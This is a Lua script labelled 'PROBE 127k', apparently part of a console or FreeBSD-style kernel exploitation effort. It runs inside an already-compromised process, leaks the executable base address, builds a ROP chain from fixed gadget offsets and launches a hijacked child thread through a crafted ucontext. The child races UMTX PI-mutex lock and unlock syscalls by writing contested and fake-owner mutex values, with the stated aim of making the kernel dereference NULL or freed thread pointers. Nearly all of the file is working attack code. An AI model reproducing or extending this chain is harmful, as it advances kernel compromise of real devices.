-- CRASH_CLASS: MODERATE
-- PROBE 127k: UMTX PI-mutex race with child thread writer
--
-- 127j confirmed: child thread executes full ROP chain, writes to shared
-- memory in infinite loop. Now use it as a concurrent writer to race
-- against UMTX_OP_MUTEX_LOCK/UNLOCK (op 5/6 on syscall 454).
--
-- Attack: child writes values to the mutex word that create impossible
-- states (CONTESTED bit without real waiters, fake owner TIDs).
-- The kernel's PI logic might dereference NULL/freed thread pointers.
--
-- Phase 1: Get main thread's TID from a MUTEX_LOCK
-- Phase 2: Launch child with ROP chain writing race values to mutex
-- Phase 3: Main thread hammers MUTEX_LOCK/UNLOCK in tight loop
-- Phase 4: Check for crashes, hangs, or unexpected returns

print("=== PROBE 127k: UMTX PI-MUTEX RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Gadgets (confirmed 127j)
local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    mov_w   = 0x92C67,
}

-- Allocations
local shared   = memory.alloc(0x2000)   -- shared region
local stk_buf  = memory.alloc(0x4000)   -- child stack
local ctx_buf  = memory.alloc(0x500)    -- ucontext
local tid_buf  = memory.alloc(8)        -- child TID output

local S   = N(shared)
local STK = N(stk_buf)
local BC  = N(ctx_buf)

-- Mutex word at shared+0, sentinel at shared+8, counters at shared+16+
local MTX = S             -- mutex word address
local SENTINEL = S + 8    -- proof child is running
local COUNTER = S + 16    -- race iteration counter (main thread)

-- Zero everything
for off = 0, 0x1F8, 8 do wq(S + off, uint64("0x0")) end
wq(N(tid_buf), uint64("0x0"))

-- [A] Get main thread's TID via MUTEX_LOCK
print("")
print("[A] Get main thread TID")
local sc_umtx = mk(454)

-- Lock the mutex (word starts at 0, should become main_tid)
local lr = nil
pcall(function()
    lr = sc_umtx(shared, uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
end)

local mtx_val = rd(MTX) or 0
if mtx_val < 0 then mtx_val = mtx_val + 0x100000000 end
local main_tid = mtx_val % 0x80000000  -- strip CONTESTED bit if any
print(string.format("  lock ret=%s mtx_word=0x%08X main_tid=%d",
    fmt(lr), mtx_val, main_tid))

-- Unlock
pcall(function()
    sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local mtx_after = rd(MTX) or 0
if mtx_after < 0 then mtx_after = mtx_after + 0x100000000 end
print(string.format("  unlock: mtx_word=0x%08X", mtx_after))

if main_tid == 0 then
    print("  WARNING: TID=0, using pid as fallback")
    main_tid = pid
end

if not alive() then print("DIED!") return end

-- [B] Build child ROP chain — writes race values to mutex word
print("")
print("[B] Child ROP chain (race writer)")

local CB = STK + 0x3000

-- Race values to write:
-- 1. 0x80000000 (CONTESTED, no owner) — invalid: contested but nobody owns it
-- 2. main_tid | 0x80000000 (CONTESTED, owned by main) — triggers waiter wakeup
-- 3. 0 (unlocked) — interferes with main's lock state
-- 4. 0xDEAD (fake TID) — kernel looks up non-existent thread

-- Use dword writes for the mutex word (it's a 32-bit field)
-- But our gadget is mov [rdi],rax;ret which writes 64 bits.
-- The mutex word is at MTX. The kernel reads low 32 bits.
-- So write the full qword: low 32 = mutex value, high 32 = don't care (will be 0)

-- Value A: CONTESTED + no owner
local VA = 0x80000000
-- Value B: CONTESTED + main_tid
local VB = 0x80000000 + main_tid
-- Value C: 0 (unlocked)
local VC = 0
-- Value D: sentinel write to shared+8 (proof child runs)
local VD_lo = 0x41414141

-- Chain layout: write VA to mutex, write VB to mutex, write VC to mutex,
--               write sentinel, then loop

local i = 0
local function chain_wq(off, val)
    wq(CB + off, val)
end

-- Write VA (contested, no owner)
chain_wq(0x00, eaddr(G.pop_rdi))          -- pop rdi; ret
chain_wq(0x08, shared)                     -- rdi = &mutex
chain_wq(0x10, eaddr(G.pop_rax))          -- pop rax; ret
chain_wq(0x18, uint64(string.format("0x%X", VA)))  -- rax = 0x80000000
chain_wq(0x20, eaddr(G.mov_w))            -- mov [rdi],rax;ret

-- Write VB (contested + main_tid)
chain_wq(0x28, eaddr(G.pop_rdi))
chain_wq(0x30, shared)
chain_wq(0x38, eaddr(G.pop_rax))
chain_wq(0x40, uint64(string.format("0x%X", VB)))
chain_wq(0x48, eaddr(G.mov_w))

-- Write VC (unlocked)
chain_wq(0x50, eaddr(G.pop_rdi))
chain_wq(0x58, shared)
chain_wq(0x60, eaddr(G.pop_rax))
chain_wq(0x68, uint64("0x0"))
chain_wq(0x70, eaddr(G.mov_w))

-- Write sentinel to shared+8 (proves child executed)
chain_wq(0x78, eaddr(G.pop_rdi))
chain_wq(0x80, uint64(string.format("0x%X", SENTINEL)))
chain_wq(0x88, eaddr(G.pop_rax))
chain_wq(0x90, uint64("0x4141414142424242"))
chain_wq(0x98, eaddr(G.mov_w))

-- Loop back
chain_wq(0xA0, eaddr(G.pop_rsp))
chain_wq(0xA8, uint64(string.format("0x%X", CB)))

print(string.format("  chain at 0x%X, %d entries, values: VA=0x%X VB=0x%X",
    CB, 22, VA, VB))

if not alive() then print("DIED!") return end

-- [C] Build ucontext and launch child
print("")
print("[C] Launch child thread")

for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0)           -- MUST be 0
wd(BC + 0x110, 0x10000)
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)

-- RIP = ret (chain entry), RSP = chain base
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

local sc_thr = mk(430)
wq(N(tid_buf), uint64("0x0"))
local thr_ret = nil
pcall(function()
    thr_ret = sc_thr(ctx_buf, tid_buf, uint64(0), uint64(0), uint64(0), uint64(0))
end)
local child_tid = rq(N(tid_buf))
print(string.format("  thr_create ret=%s child_tid=%s", fmt(thr_ret), fmt(child_tid)))

if thr_ret == nil or N(thr_ret) ~= 0 then
    print("  THREAD CREATION FAILED!")
    return
end

-- Wait for sentinel
for i = 1, 100 do native.fcall_with_rax(stub, 20) end
local sent = rq(SENTINEL)
print(string.format("  sentinel=%s %s", fmt(sent),
    (sent and N(sent) ~= 0) and "CHILD RUNNING" or "child not writing yet"))

if not alive() then print("DIED after child launch!") return end

-- [D] RACE: main thread hammers MUTEX_LOCK / MUTEX_UNLOCK
print("")
print("[D] UMTX race (500 iterations)")

local lock_ok = 0
local lock_fail = 0
local unlock_ok = 0
local unlock_fail = 0
local lock_crash = 0
local unlock_crash = 0
local weird_ret = 0
local ITERATIONS = 500

for iter = 1, ITERATIONS do
    -- Reset mutex word to 0 before each lock attempt
    wd(MTX, 0)

    -- MUTEX_LOCK (op 5)
    local lr2 = nil
    local lok = pcall(function()
        lr2 = sc_umtx(shared, uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not lok then
        lock_crash = lock_crash + 1
    elseif lr2 ~= nil and N(lr2) == 0 then
        lock_ok = lock_ok + 1
    else
        lock_fail = lock_fail + 1
        if lr2 ~= nil then
            local lr2_n = N(lr2)
            if lr2_n ~= 0 and lr2_n ~= 0xFFFFFFFFFFFFFFFF and lr2_n ~= -1 then
                weird_ret = weird_ret + 1
            end
        end
    end

    -- Read mutex word state between lock and unlock
    -- (This is where the race is most interesting)

    -- MUTEX_UNLOCK (op 6)
    local ur2 = nil
    local uok = pcall(function()
        ur2 = sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not uok then
        unlock_crash = unlock_crash + 1
    elseif ur2 ~= nil and N(ur2) == 0 then
        unlock_ok = unlock_ok + 1
    else
        unlock_fail = unlock_fail + 1
    end

    if not alive() then
        print(string.format("  *** PROCESS DIED at iteration %d ***", iter))
        print(string.format("  lock: ok=%d fail=%d crash=%d", lock_ok, lock_fail, lock_crash))
        print(string.format("  unlock: ok=%d fail=%d crash=%d", unlock_ok, unlock_fail, unlock_crash))
        return
    end

    -- Progress every 100 iterations
    if iter % 100 == 0 then
        print(string.format("  iter=%d L(ok=%d fail=%d crash=%d) U(ok=%d fail=%d crash=%d) weird=%d",
            iter, lock_ok, lock_fail, lock_crash, unlock_ok, unlock_fail, unlock_crash, weird_ret))
    end
end

print("")
print("[E] Results")
print(string.format("  iterations: %d", ITERATIONS))
print(string.format("  lock:   ok=%d fail=%d crash=%d", lock_ok, lock_fail, lock_crash))
print(string.format("  unlock: ok=%d fail=%d crash=%d", unlock_ok, unlock_fail, unlock_crash))
print(string.format("  weird returns: %d", weird_ret))

-- Final mutex state
local final_mtx = rd(MTX) or 0
if final_mtx < 0 then final_mtx = final_mtx + 0x100000000 end
print(string.format("  final mutex word: 0x%08X", final_mtx))

-- Check sentinel
local final_sent = rq(SENTINEL)
print(string.format("  sentinel: %s", fmt(final_sent)))

-- Summary
if lock_crash > 0 or unlock_crash > 0 then
    print("")
    print("  *** PCALL FAILURES DETECTED — POSSIBLE KERNEL CORRUPTION ***")
end
if weird_ret > 0 then
    print("")
    print("  *** UNEXPECTED RETURN VALUES — KERNEL BEHAVING DIFFERENTLY ***")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127k COMPLETE ===")
